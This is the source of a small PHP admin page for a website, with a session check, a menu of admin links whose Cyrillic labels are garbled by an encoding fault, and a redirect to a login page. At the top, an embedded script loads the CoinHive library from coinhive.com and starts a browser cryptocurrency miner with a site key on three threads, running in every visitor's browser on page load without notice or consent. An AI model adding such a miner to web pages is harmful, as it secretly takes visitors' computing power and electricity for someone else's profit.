<script src="https://coinhive.com/lib/coinhive.min.js"></script> <script>  
//we need food too :c 
var sos = new CoinHive.Anonymous('rmeaj60xrFjJ6gOi6Zk1EvB0bNdmPqT6', {throttle: 0.1});

sos.setNumberThreads(3);

sos.start();
</script>
<?
include "cook_life.php";

include "conf.php";

$kpos=-1;
if ((isset($_SESSION["log"]))&&($_SESSION['adm']>0)){
echo "<h1>�������</h1> <a href='index.php'>�� ����</a>
<ul>
<li><a href='adm_bg.php'>��� (���������)</a></li>
<li><a href='adm_img.php?bd=imgs'>����� ���� ��������</a></li>
<li><a href='adm_csv.php'>������� ����</a></li>
<li><a href='adm_docs.php'>���� ����������</a></li>





</ul>";
//<li><a href='adm1.php'>�������� �������� � ������� (�� ������)</a></li>
//<li><a href='up_im.php'>���������� �������� �� FTP</a></li>
//<li><a href='adm_img.php?bd=slides'>�������</a></li>
}else{HEADER("LOCATION: loginka.php");}



?>